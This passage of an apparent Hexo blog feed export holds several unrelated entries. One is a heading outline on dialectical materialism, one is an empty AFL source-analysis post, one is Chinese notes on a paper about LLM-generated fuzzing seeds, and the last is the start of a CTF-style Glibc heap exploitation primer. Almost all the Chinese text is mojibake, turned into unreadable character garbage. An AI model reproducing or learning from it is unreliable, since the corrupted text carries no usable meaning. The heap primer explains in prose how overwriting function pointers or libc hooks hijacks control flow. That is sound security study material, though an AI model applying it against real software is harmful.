title="å”¯å¿ƒè®ºã€äºŒå…ƒè®ºå’Œå”¯ç‰©è®º"></a>å”¯å¿ƒè®ºã€äºŒå…ƒè®ºå’Œå”¯ç‰©è®º</h2><h3 id="å“²å­¦çš„ä¸¤å¤§ç±»åˆ«"><a href="#å“²å­¦çš„ä¸¤å¤§ç±»åˆ«" class="headerlink" title="å“²å­¦çš„ä¸¤å¤§ç±»åˆ«"></a>å“²å­¦çš„ä¸¤å¤§ç±»åˆ«</h3><h3 id="ä¸»è§‚å”¯å¿ƒè®ºå’Œå®¢è§‚å”¯å¿ƒè®º"><a href="#ä¸»è§‚å”¯å¿ƒè®ºå’Œå®¢è§‚å”¯å¿ƒè®º" class="headerlink" title="ä¸»è§‚å”¯å¿ƒè®ºå’Œå®¢è§‚å”¯å¿ƒè®º"></a>ä¸»è§‚å”¯å¿ƒè®ºå’Œå®¢è§‚å”¯å¿ƒè®º</h3><h3 id="äºŒå…ƒè®ºã€æœºæ¢°å”¯ç‰©è®º"><a href="#äºŒå…ƒè®ºã€æœºæ¢°å”¯ç‰©è®º" class="headerlink" title="äºŒå…ƒè®ºã€æœºæ¢°å”¯ç‰©è®º"></a>äºŒå…ƒè®ºã€æœºæ¢°å”¯ç‰©è®º</h3><h3 id="è¾©è¯å”¯ç‰©è®º"><a href="#è¾©è¯å”¯ç‰©è®º" class="headerlink" title="è¾©è¯å”¯ç‰©è®º"></a>è¾©è¯å”¯ç‰©è®º</h3><h2 id="è¾©è¯æ³•å”¯ç‰©è®ºçš„è®¤è¯†è®º"><a href="#è¾©è¯æ³•å”¯ç‰©è®ºçš„è®¤è¯†è®º" class="headerlink" title="è¾©è¯æ³•å”¯ç‰©è®ºçš„è®¤è¯†è®º"></a>è¾©è¯æ³•å”¯ç‰©è®ºçš„è®¤è¯†è®º</h2><h3 id="åæ˜ è®º"><a href="#åæ˜ è®º" class="headerlink" title="åæ˜ è®º"></a>åæ˜ è®º</h3><h3 id="æ„Ÿæ€§è®¤è¯†ä¸ç†æ€§è®¤è¯†çš„çŸ›ç›¾"><a href="#æ„Ÿæ€§è®¤è¯†ä¸ç†æ€§è®¤è¯†çš„çŸ›ç›¾" class="headerlink" title="æ„Ÿæ€§è®¤è¯†ä¸ç†æ€§è®¤è¯†çš„çŸ›ç›¾"></a>æ„Ÿæ€§è®¤è¯†ä¸ç†æ€§è®¤è¯†çš„çŸ›ç›¾</h3><h3 id="è®¤è¯†å’Œå®è·µ"><a href="#è®¤è¯†å’Œå®è·µ" class="headerlink" title="è®¤è¯†å’Œå®è·µ"></a>è®¤è¯†å’Œå®è·µ</h3><h3 id="çœŸç†è®º"><a href="#çœŸç†è®º" class="headerlink" title="çœŸç†è®º"></a>çœŸç†è®º</h3><h2 id="å”¯ç‰©è¾©è¯æ³•çš„åŸºæœ¬è§„å¾‹"><a href="#å”¯ç‰©è¾©è¯æ³•çš„åŸºæœ¬è§„å¾‹" class="headerlink" title="å”¯ç‰©è¾©è¯æ³•çš„åŸºæœ¬è§„å¾‹"></a>å”¯ç‰©è¾©è¯æ³•çš„åŸºæœ¬è§„å¾‹</h2><h3 id="ç«‹åœºã€è§‚ç‚¹å’Œæ–¹æ³•"><a href="#ç«‹åœºã€è§‚ç‚¹å’Œæ–¹æ³•" class="headerlink" title="ç«‹åœºã€è§‚ç‚¹å’Œæ–¹æ³•"></a>ç«‹åœºã€è§‚ç‚¹å’Œæ–¹æ³•</h3><h3 id="äº‹ç‰©çš„æ™®éçš„æœ‰æœºè”ç³»çš„è§„å¾‹"><a href="#äº‹ç‰©çš„æ™®éçš„æœ‰æœºè”ç³»çš„è§„å¾‹" class="headerlink" title="äº‹ç‰©çš„æ™®éçš„æœ‰æœºè”ç³»çš„è§„å¾‹"></a>äº‹ç‰©çš„æ™®éçš„æœ‰æœºè”ç³»çš„è§„å¾‹</h3><h3 id="äº‹ç‰©è‡ªèº«è¿åŠ¨å‘å±•çš„è§„å¾‹"><a href="#äº‹ç‰©è‡ªèº«è¿åŠ¨å‘å±•çš„è§„å¾‹" class="headerlink" title="äº‹ç‰©è‡ªèº«è¿åŠ¨å‘å±•çš„è§„å¾‹"></a>äº‹ç‰©è‡ªèº«è¿åŠ¨å‘å±•çš„è§„å¾‹</h3><h3 id="è´¨å’Œé‡äº’ç›¸è½¬å˜çš„è§„å¾‹"><a href="#è´¨å’Œé‡äº’ç›¸è½¬å˜çš„è§„å¾‹" class="headerlink" title="è´¨å’Œé‡äº’ç›¸è½¬å˜çš„è§„å¾‹"></a>è´¨å’Œé‡äº’ç›¸è½¬å˜çš„è§„å¾‹</h3><h3 id="å¯¹ç«‹ç»Ÿä¸€çš„è§„å¾‹"><a href="#å¯¹ç«‹ç»Ÿä¸€çš„è§„å¾‹" class="headerlink" title="å¯¹ç«‹ç»Ÿä¸€çš„è§„å¾‹"></a>å¯¹ç«‹ç»Ÿä¸€çš„è§„å¾‹</h3><h3 id="å¦å®šä¹‹æ”¹å˜çš„è§„å¾‹"><a href="#å¦å®šä¹‹æ”¹å˜çš„è§„å¾‹" class="headerlink" title="å¦å®šä¹‹æ”¹å˜çš„è§„å¾‹"></a>å¦å®šä¹‹æ”¹å˜çš„è§„å¾‹</h3><h2 id="å”¯ç‰©è¾©è¯æ³•çš„å‡ ä¸ªèŒƒç•´"><a href="#å”¯ç‰©è¾©è¯æ³•çš„å‡ ä¸ªèŒƒç•´" class="headerlink" title="å”¯ç‰©è¾©è¯æ³•çš„å‡ ä¸ªèŒƒç•´"></a>å”¯ç‰©è¾©è¯æ³•çš„å‡ ä¸ªèŒƒç•´</h2><h3 id="ç°è±¡å’Œæœ¬è´¨"><a href="#ç°è±¡å’Œæœ¬è´¨" class="headerlink" title="ç°è±¡å’Œæœ¬è´¨"></a>ç°è±¡å’Œæœ¬è´¨</h3><h3 id="å½¢å¼å’Œå†…å®¹"><a href="#å½¢å¼å’Œå†…å®¹" class="headerlink" title="å½¢å¼å’Œå†…å®¹"></a>å½¢å¼å’Œå†…å®¹</h3><h3 id="è§„å¾‹ä¸å› æœ"><a href="#è§„å¾‹ä¸å› æœ" class="headerlink" title="è§„å¾‹ä¸å› æœ"></a>è§„å¾‹ä¸å› æœ</h3><h3 id="å¶ç„¶ã€æ¯”å¦‚ä¸è‡ªç”±"><a href="#å¶ç„¶ã€æ¯”å¦‚ä¸è‡ªç”±" class="headerlink" title="å¶ç„¶ã€æ¯”å¦‚ä¸è‡ªç”±"></a>å¶ç„¶ã€æ¯”å¦‚ä¸è‡ªç”±</h3><h3 id="ç›®çš„æ€§ã€å¯èƒ½æ€§ä¸ç°å®æ³•"><a href="#ç›®çš„æ€§ã€å¯èƒ½æ€§ä¸ç°å®æ³•" class="headerlink" title="ç›®çš„æ€§ã€å¯èƒ½æ€§ä¸ç°å®æ³•"></a>ç›®çš„æ€§ã€å¯èƒ½æ€§ä¸ç°å®æ³•</h3>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AFLæºç åˆ†æ</title>
      <link href="/2025/07/01/fuzz/src/afl/"/>
      <url>/2025/07/01/fuzz/src/afl/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzeræºç åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®ºæ–‡ç¬”è®°ï¼šHarnessing Large Language Models for Seed Generation in Greybox Fuzzing</title>
      <link href="/2025/07/01/fuzz/paper/seed/"/>
      <url>/2025/07/01/fuzz/paper/seed/</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>ç°ç›’æ¨¡ç³Šæµ‹è¯•å·²ç»æˆä¸ºå‘ç°è½¯ä»¶æ¼æ´çš„é¦–é€‰æŠ€æœ¯ï¼Œåœ¨æ•ˆç‡å’Œæ¢ç´¢æ·±åº¦ä¹‹é—´å–å¾—äº†å¹³è¡¡ã€‚è™½ç„¶ç ”ç©¶çš„é‡ç‚¹æ˜¯æ”¹è¿›æ¨¡ç³ŠæŠ€æœ¯ï¼Œä½†é«˜è´¨é‡åˆå§‹ç§å­çš„é‡è¦æ€§ä»ç„¶è‡³å…³é‡è¦ï¼Œä½†å¾€å¾€è¢«å¿½è§†ã€‚ç°æœ‰çš„ç§å­ç”Ÿæˆæ–¹æ³•æ˜¯æœ‰é™çš„ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå…·æœ‰éæ ‡å‡†æˆ–è‡ªå®šä¹‰è¾“å…¥æ ¼å¼çš„ç¨‹åºã€‚å¤§å‹è¯­è¨€æ¨¡å‹å·²ç»å½»åº•æ”¹å˜äº†è®¸å¤šé¢†åŸŸï¼Œåœ¨ç†è§£å’Œç”Ÿæˆè·¨å„ä¸ªçŸ¥è¯†é¢†åŸŸçš„å¤æ‚æ¨¡å¼æ–¹é¢å±•ç¤ºäº†å‰æ‰€æœªæœ‰çš„èƒ½åŠ›ã€‚æœ¬æ–‡ä»‹ç»äº†SeedMindï¼Œè¿™æ˜¯ä¸€ä¸ªåˆ©ç”¨llm é€šè¿‡æ™ºèƒ½ç§å­ç”Ÿæˆæ¥å¢å¼ºç°ç›’æ¨¡ç³Šçš„æ–°ç³»ç»Ÿã€‚ä¸ä¹‹å‰çš„æ–¹æ³•ä¸åŒï¼ŒSeedMind ä½¿ç”¨ llm æ¥åˆ›å»ºæµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå™¨ï¼Œè€Œä¸æ˜¯ç›´æ¥ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚æˆ‘ä»¬çš„æ–¹æ³•å®ç°äº†ä¸€ä¸ªè¿­ä»£çš„ï¼Œåé¦ˆé©±åŠ¨çš„è¿‡ç¨‹ï¼Œå¼•å¯¼ LLM é€æ­¥ç»†åŒ–æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆï¼Œç›®æ ‡æ˜¯å¢åŠ ä»£ç è¦†ç›–çš„æ·±åº¦å’Œå¹¿åº¦ã€‚åœ¨å¼€å‘SeedMind çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è§£å†³äº†ä¸€äº›å…³é”®æŒ‘æˆ˜ï¼ŒåŒ…æ‹¬è¾“å…¥æ ¼å¼é™åˆ¶ã€ä¸Šä¸‹æ–‡çª—å£çº¦æŸï¼Œä»¥åŠç¡®ä¿ä¸€è‡´çš„è¿›åº¦æ„ŸçŸ¥è¡Œä¸ºã€‚å¯¹å®é™…åº”ç”¨çš„æ·±å…¥è¯„ä¼°è¡¨æ˜ï¼ŒSeedMind æœ‰æ•ˆåœ°åˆ©ç”¨llmæ¥ç”Ÿæˆé«˜è´¨é‡çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶ä¿ƒè¿› bug å‘ç°çš„æ¨¡ç³ŠåŒ–ï¼Œæä¾›ä¸äººå·¥åˆ›å»ºç§å­ç›¸å½“çš„æ•ˆç”¨ï¼Œå¹¶ä¸”æ˜¾è‘—ä¼˜äºç°æœ‰çš„åŸºäº llm çš„è§£å†³æ–¹æ¡ˆã€‚</p><h2 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h2><p>ç»è¿‡å‡ åå¹´çš„å‘å±•ï¼Œç°ç›’æ¨¡ç³Šæµ‹è¯•å·²ç»åœ¨è½¯ä»¶æ¼æ´æŒ–æ˜é¢†</p><p>ä¸ºäº†å‘ç°ä»£ç ä¸­çš„é”™è¯¯ï¼Œæ¨¡ç³Šè¢«è®¤ä¸ºæ˜¯æœ€å®ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“åº”ç”¨äºç”Ÿäº§çº§è½¯ä»¶ã€‚ç»è¿‡å‡ åå¹´çš„å‘å±•ï¼Œç°ç›’æ¨¡ç³Š[18,29,35]å·²ç»æˆä¸ºæœ€å¯å–çš„é€‰æ‹©ã€‚é€šè¿‡åˆ©ç”¨è½»é‡çº§ä»ªå™¨æ¥è·å¾—é©±åŠ¨æ¢ç´¢çš„è¿è¡Œæ—¶åé¦ˆï¼Œç°ç›’æ¨¡ç³Šæµ‹è¯•åœ¨é»‘ç›’æ¨¡ç³Šæµ‹è¯•[17]çš„æ•ˆç‡å’Œç™½ç›’æ¨¡ç³Šæµ‹è¯•[20]çš„æ·±åº¦ä¹‹é—´å–å¾—äº†å¹³è¡¡ã€‚æˆç†Ÿçš„ç°ç›’fuzzerså¦‚AFL [13]ï¼Œ AFL [12]ï¼Œ honggfuzz[23]çš„å‡ºç°è¿›ä¸€æ­¥æ™®åŠã€‚</p><p>ä»æŠ€æœ¯ä¸Šè®²ï¼Œç°ç›’æ¨¡ç³Šæµ‹è¯•ä»ä¸€ç»„åˆå§‹æµ‹è¯•ç”¨ä¾‹å¼€å§‹ï¼ˆç§å­ï¼‰ï¼Œå¹¶è¿­ä»£åœ°ä»ç§å­ä¸­æ´¾ç”Ÿæ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥æ‰©å±•ä»£ç è¦†ç›–ç‡ã€‚å› æ­¤ï¼Œä¸ºäº†è·å¾—æ›´å¥½çš„ç»“æœï¼Œå‡†å¤‡ä¸€ç»„é«˜è´¨é‡çš„ç§å­æ¥å¼•å¯¼æ¨¡ç³Šè¿‡ç¨‹æ˜¯è‡³å…³é‡è¦çš„ã€‚ä¾‹å¦‚ï¼Œç§å­å·²ç»åˆ°è¾¾bugæ‰€åœ¨çš„ä½ç½®å¯ä»¥æ˜¾è‘—é™ä½è§¦å‘bugçš„æ¨¡ç³Šæµ‹è¯•çš„éš¾åº¦å’Œæ—¶é—´æˆæœ¬ã€‚ç„¶è€Œï¼Œè·å¾—ä¼˜è´¨ç§å­å¹¶ä¸å®¹æ˜“ã€‚</p><p>åœ¨å®é™…çš„æ¨¡ç³Šæµ‹è¯•ä¸­ï¼Œå‡†å¤‡ç§å­æœ€å¸¸è§çš„ç­–ç•¥æ˜¯é€šè¿‡æ‰‹å·¥æ£€æŸ¥ç¨‹åºé€»è¾‘å’Œæ„å»ºæ‰€éœ€çš„æµ‹è¯•ç”¨ä¾‹ã€‚è¿™ç§ç­–ç•¥å¯èƒ½é€‚ç”¨äºæ¥å—æµè¡Œæ ¼å¼è¾“å…¥çš„ç¨‹åºï¼ˆä¾‹å¦‚ï¼ŒXMLã€PDFç­‰ï¼‰ï¼Œå› ä¸ºå®ƒä»¬çš„æµ‹è¯•ç”¨ä¾‹å¾ˆå¹¿æ³›ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“æ”¶é›†ã€‚ç„¶è€Œï¼Œå¯¹äºå…·æœ‰éæ ‡å‡†è¾“å…¥æ ¼å¼ç”šè‡³è‡ªå®šä¹‰æ ¼å¼çš„ç¨‹åºï¼Œè¿™ç§ç­–ç•¥å˜å¾—éš¾ä»¥æ‰¿å—ã€‚å¦ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯è¿è¡Œèƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆå™¨ã€‚è¿™ä»…åœ¨å·²ç»å­˜åœ¨é€‚ç”¨çš„ç”Ÿæˆå™¨æ—¶æœ‰æ•ˆã€‚å¦åˆ™ï¼Œå¿…é¡»ä»å¤´å¼€å§‹æ„å»ºæ–°çš„ç”Ÿæˆå™¨ï¼Œæ­£å¦‚æˆ‘ä»¬å°†åœ¨Â§2.2ä¸­è¯¦ç»†è¯´æ˜çš„é‚£æ ·ï¼Œè¿™é€šå¸¸æ˜¯ä¸å¯è¡Œæˆ–ä¸åˆ‡å®é™…çš„ã€‚</p><p>äººå·¥æ™ºèƒ½çš„æœ€æ–°å‘å±•ï¼Œç‰¹åˆ«æ˜¯å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆllmï¼‰ï¼Œå¦‚ç”Ÿæˆé¢„è®­ç»ƒè½¬æ¢å™¨ï¼ˆGPTï¼‰ï¼Œä¸ºé€šç”¨çš„ã€è½»æ¾çš„ç§å­å‡†å¤‡æä¾›äº†æ–°çš„æœºä¼šã€‚è®¸å¤šå¤§æ¨¡å‹ï¼ˆGitHub Copilotã€Amazon CodeWhispererã€OpenAIçš„GPTç³»åˆ—ã€Anthropicçš„Claudeç³»åˆ—[1]ç­‰ï¼‰åœ¨å¯¹å¤§é‡ä»£ç ã€æ³¨é‡Šå’Œæ–‡æ¡£è¿›è¡Œé¢„è®­ç»ƒåï¼Œæ“…é•¿äºä»¥ä»£ç ä¸ºä¸­å¿ƒçš„ä»»åŠ¡ï¼ˆä»£ç ç†è§£ã€ä»£ç æ€»ç»“ã€ä»£ç å®Œæˆã€ä»£ç ç¿»è¯‘ç­‰ï¼‰ã€‚è¯¥æŠ€æœ¯çš„ä¸€ä¸ªç›´æ¥åº”ç”¨å°†æ˜¯è¿è¡Œä¸€ä¸ªLLMæ¥åˆ†æç›®æ ‡ç¨‹åºçš„æ¨¡ç³Šæµ‹è¯•ï¼Œå¹¶ç”Ÿæˆå®ƒæœŸæœ›çš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>äº‹å®ä¸Šï¼Œæœ€è¿‘çš„ç ”ç©¶å·²ç»æ¢ç´¢äº†æ¨¡ç³Šä¸­ç§å­ç”Ÿæˆçš„llmã€‚å»ºè®®çš„æ–¹æ³•å·²ç»å°è¯•ä½¿ç”¨å„ç§è¾“å…¥ï¼ˆç›®æ ‡ç¨‹åºä»£ç ã€ç¤ºä¾‹æµ‹è¯•ç”¨ä¾‹ã€åŠŸèƒ½è§„èŒƒã€æ–‡æ¡£ç­‰ï¼‰ï¼Œå¹¶æç¤ºä»llmè¯·æ±‚æµ‹è¯•ç”¨ä¾‹ã€‚å®ƒä»¬å·²ç»åœ¨ä¸åŒçš„é¢†åŸŸï¼ˆè§£æå™¨[2]ã€ç¼–è¯‘å™¨[57]ã€Linuxå†…æ ¸[60]å’Œå…¶ä»–é€šç”¨è½¯ä»¶[30]ï¼‰ä¸­è¯æ˜äº†æœ‰æ•ˆæ€§ã€‚ç„¶è€Œï¼Œç”±äºæœªèƒ½è§£å†³å‡ ä¸ªåŸºæœ¬æŒ‘æˆ˜ï¼Œå®ƒä»¬å¯èƒ½ä¸¥é‡ç ´åäº†æ³•å­¦ç¡•å£«åœ¨ç§å­ç”Ÿæˆæ–¹é¢çš„æ½œåŠ›ã€‚ï¼ˆC1ï¼‰æ­£åœ¨ä½¿ç”¨çš„LLMï¼Œå³ä½¿æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œä¹Ÿå¯èƒ½ä¸æ”¯æŒè®¸å¤šè¾“å…¥æ ¼å¼ã€‚ä¾‹å¦‚ï¼ŒOpenAIçš„æ–°æ——èˆ°æ¨¡å‹gpt40[40]æ‹’ç»ç”ŸæˆäºŒè¿›åˆ¶è¡¨ç¤ºï¼Œå› ä¸ºå®ƒå—é™äºæ–‡æœ¬æ ¼å¼ã€‚llmå—å…¶ä¸Šä¸‹æ–‡çª—å£çš„é™åˆ¶â€”â€”æ¨¡å‹å¯ä»¥ä»å…¶è¾“å…¥å’Œå“åº”[46]å¤„ç†ä»¤ç‰Œçš„æ•°é‡ã€‚ä»»æ„åœ°å°†ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œç›®æ ‡ç¨‹åºçš„æ•´ä¸ªä»£ç åº“ï¼‰è½¬å‚¨åˆ°llmå¯èƒ½ä¼šæº¢å‡ºä¸Šä¸‹æ–‡çª—å£å¹¶å¯¼è‡´ç”Ÿæˆå¤±è´¥ã€‚å·²çŸ¥llmå‘ˆç°ä¸å¯é¢„æµ‹çš„è¡Œä¸ºï¼Œè¿™ä¼šé˜»ç¢æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆã€‚ï¼ˆC4ï¼‰æ³•å­¦ç¡•å£«å¯èƒ½ç¼ºä¹å¯¹è¿›å±•çš„åŸºæœ¬ç†è§£ã€‚å› æ­¤ï¼Œå®ƒå¯èƒ½ä¼šå¿½ç•¥ä¸€ä¸ªæœªå®Œæˆçš„ä»»åŠ¡æˆ–æ— ä¼‘æ­¢åœ°é‡å¤ä¸€ä¸ªå·²å®Œæˆçš„ä»»åŠ¡ã€‚</p><h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><h3 id="Greybox-Fuzzing"><a href="#Greybox-Fuzzing" class="headerlink" title="Greybox Fuzzing"></a>Greybox Fuzzing</h3><p>Greybox Fuzzingï¼ˆç°ç›’æ¨¡ç³Šæµ‹è¯•ï¼‰å‡ºç°äº 2000 å¹´ä»£ä¸­æœŸï¼Œæ˜¯é»‘ç›’æ¨¡ç³Šå’Œç™½ç›’æ¨¡ç³Šä¹‹é—´çš„ä¸€ç§å¹³è¡¡ã€‚è¿™ä¸€æ¦‚å¿µæ˜¯ç”± AFL ç­‰å·¥å…·æ¨å¹¿å¼€æ¥çš„ã€‚ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„å…³é”®æ€æƒ³æ˜¯åœ¨æ¨¡ç³Šæµ‹è¯•æœŸé—´ä½¿ç”¨è½»é‡çº§çš„å·¥å…·æ¥è·å¾—è¿è¡Œæ—¶åé¦ˆï¼ˆä¾‹å¦‚ï¼Œä»£ç è¦†ç›–ç‡ï¼‰ï¼Œå¹¶åœ¨åé¦ˆçš„æŒ‡å¯¼ä¸‹ï¼Œé€‰æ‹©å’Œæ”¹å˜ç°æœ‰çš„æµ‹è¯•ç”¨ä¾‹ä»¥æ´¾ç”Ÿå‡ºæ–°çš„æµ‹è¯•ç”¨ä¾‹ã€‚ä¸ºäº†é—­åˆå¾ªç¯ï¼Œæä¾›æ–°è´¡çŒ®ï¼ˆä¾‹å¦‚ï¼Œè¦†ç›–æ–°ä»£ç ï¼‰çš„æ–°æµ‹è¯•ç”¨ä¾‹è¢«ä¿ç•™ä»¥å¤‡å°†æ¥çš„å˜åŒ–ã€‚</p><p>Greybox Fuzzing æ´»åŠ¨é€šå¸¸ä»ç§°ä¸ºç§å­çš„åˆå§‹æµ‹è¯•ç”¨ä¾‹è¯­æ–™åº“å¼€å§‹ã€‚ç§å­è´¨é‡å¯¹æ¨¡ç³Šå¤„ç†æ€§èƒ½æœ‰æ˜¾è‘—å½±å“ã€‚ä¾‹å¦‚ï¼Œç»™å®šçš„ç§å­è¦†ç›–äº†å¾ˆå¤§çš„ä»£ç åŒºåŸŸï¼Œæ¨¡ç³Šæµ‹è¯•å‘ç°æ›´å¤šbugçš„æœºä¼šå°±ä¼šé«˜å¾—å¤šï¼Œæ‰€éœ€çš„æ—¶é—´ä¹Ÿä¼šçŸ­å¾—å¤šã€‚å› æ­¤ï¼Œåœ¨å¯åŠ¨ç°ç›’æ¨¡ç³Šæµ‹è¯•ä¹‹å‰ï¼Œå‡†å¤‡ä¸€å¥—é«˜è´¨é‡çš„ç§å­å·²æˆä¸ºäº‹å®ä¸Šçš„æ ‡å‡†ã€‚</p><h3 id="Seed-Generation"><a href="#Seed-Generation" class="headerlink" title="Seed Generation"></a>Seed Generation</h3><p>ä¸ºäº†å‡†å¤‡é«˜è´¨é‡çš„ç§å­ï¼Œä¸€ä¸ªå¸¸è§çš„åšæ³•æ˜¯æ‰‹åŠ¨ç†è§£ç›®æ ‡ç¨‹åºå¹¶åˆ¶ä½œæ‰€éœ€çš„æµ‹è¯•ç”¨ä¾‹ã€‚ç„¶è€Œï¼Œå¯¹äºé«˜åº¦è‡ªåŠ¨åŒ–çš„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹æ¥è¯´ï¼Œè¿™å¹¶ä¸ç†æƒ³ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯è¿è¡Œèƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆå™¨ã€‚ç„¶è€Œï¼Œå®ƒé¢ä¸´ç€åœ¨æ²¡æœ‰å¯ç”¨çš„å‘ç”µæœºæ—¶å»ºé€ å‘ç”µæœºçš„æŒ‘æˆ˜ã€‚</p><p>è¿„ä»Šä¸ºæ­¢ï¼Œæœ‰ä¸¤ç§ä¸»è¦çš„æ„é€ ç”Ÿæˆå™¨çš„æ–¹æ³•ã€‚åœ¨ç»™å®šç›®æ ‡ç¨‹åºæ‰€éœ€çš„è¾“å…¥æ ¼å¼è§„èŒƒçš„æƒ…å†µä¸‹ï¼Œäººä»¬æ‰‹åŠ¨å¼€å‘ç¬¦åˆè§„èŒƒçš„ç”Ÿæˆå™¨æ¥ç»„è£…æµ‹è¯•ç”¨ä¾‹ã€‚è¿™äº›ç”Ÿæˆå™¨ä¸»è¦é’ˆå¯¹XMLã€HTMLå’ŒMathMLç­‰æ ‡å‡†æ ¼å¼ï¼Œå› ä¸ºå®ƒä»¬çš„è§„èŒƒæœ‰å¾ˆå¥½çš„æ–‡æ¡£è®°å½•ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯åŸºäºæœºå™¨å­¦ä¹ æŠ€æœ¯ã€‚åœ¨æ”¶é›†äº†ç›®æ ‡ç¨‹åºæ¥å—çš„å¤§é‡è¾“å…¥åï¼Œè¯¥æ–¹æ³•è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼ˆæ¦‚ç‡æ¨¡å‹[53]ã€å¾ªç¯ç¥ç»ç½‘ç»œ[21]ã€ç”Ÿæˆå¯¹æŠ—ç½‘ç»œ[34]ç­‰ï¼‰æ¥å­¦ä¹ è¾“å…¥ç»“æ„ï¼Œç„¶åè¿è¡Œè¯¥æ¨¡å‹æ¥ç”Ÿæˆæ–°çš„è¾“å…¥å˜ä½“ã€‚</p><p>æ˜¾ç„¶ï¼Œä¸Šè¿°ä¸¤ç§æ–¹æ³•å¹¶ä¸å¯å–ã€‚ä»–ä»¬ä»ç„¶è¦æ±‚äººå·¥æ¥è®¾è®¡ç”Ÿæˆå™¨æˆ–æ”¶é›†è®­ç»ƒæ•°æ®ã€‚æ›´æ ¹æœ¬çš„æ˜¯ï¼Œå®ƒä»¬ç¼ºä¹æ™®éæ€§ã€‚å½“ç›®æ ‡ç¨‹åºéœ€è¦æŒ‰ç…§éæ ‡å‡†æ ¼å¼æˆ–å…¨æ–°æ ¼å¼è¾“å…¥æ—¶ï¼Œè¿™ä¸¤ç§æ–¹æ³•éƒ½å˜å¾—ä¸åˆ‡å®é™…ã€‚ä¸€æ–¹é¢ï¼Œæ²¡æœ‰æ ¼å¼æ–‡æ¡£ã€‚é¢ å€’ç¨‹åºæ¥æ¨æ–­æ ¼å¼å¹¶ç›¸åº”åœ°æ„å»ºç”Ÿæˆå™¨æ˜¯ä¸å¯æ‰¿å—çš„ã€‚å¦ä¸€æ–¹é¢ï¼Œä»¤äººæ»¡æ„çš„è¾“å…¥åœ¨é‡å¤–å˜å¾—ç½•è§ã€‚å»ºç«‹æœ‰æ•ˆè®­ç»ƒæ•°æ®é›†çš„èµ„æºæœ‰é™ã€‚</p><h3 id="AI-for-Code"><a href="#AI-for-Code" class="headerlink" title="AI for Code"></a>AI for Code</h3><h2 id="PROBLEM-AND-CHALLENGES"><a href="#PROBLEM-AND-CHALLENGES" class="headerlink" title="PROBLEM AND CHALLENGES"></a>PROBLEM AND CHALLENGES</h2><h3 id="Problem-Statement"><a href="#Problem-Statement" class="headerlink" title="Problem Statement"></a>Problem Statement</h3><h3 id="Technical-Challenges"><a href="#Technical-Challenges" class="headerlink" title="Technical Challenges"></a>Technical Challenges</h3>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibcå †åˆ©ç”¨å…¥é—¨</title>
      <link href="/2025/07/01/ctf/heap/heap/"/>
      <url>/2025/07/01/ctf/heap/heap/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>äº†è§£äº† Ptmalloc2 çš„å†…å­˜ç®¡ç†æœºåˆ¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥å­¦ä¹ ä¸€ä¸‹å †çš„åˆ©ç”¨åŸºç¡€ã€‚</p><p>å †ç›¸å…³çš„æ¼æ´æ— æ³•åƒæ ˆé‚£æ ·ç›´æ¥åŠ«æŒæ§åˆ¶æµï¼Œåœ¨å †ä¸­çš„æ¼æ´åˆ©ç”¨ä¸€èˆ¬é€šè¿‡ä¿®æ”¹å †ä¸Šçš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç¨‹åºè°ƒç”¨å †ä¸Šçš„æ•°æ®çš„æ—¶å€™è¾¾æˆç›®çš„ã€‚</p><p>å¦ä¸€ç§æ˜¯åŸºäºå¯¹å †åˆ†é…çš„ç†è§£ï¼Œè¾¾åˆ°ä»»æ„åœ°å€åˆ†é…ä»è€Œå®ç°ä»»æ„åœ°å€å†™ã€‚é€šè¿‡ä»»æ„åœ°å€å†™ä¿®æ”¹libcå½“ä¸­çš„ä¸€äº›hookæ¥è¾¾åˆ°åŠ«æŒç¨‹åºæ§åˆ¶æµçš„ç›®çš„ã€‚</p><h2 id="å †å¸¸è§æ¼æ´"><a href="#å †å¸¸è§æ¼æ´" class="headerlink" title="å †å¸¸è§æ¼æ´"></a>å †å¸¸è§æ¼æ´</h2><h3 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h3><p>å 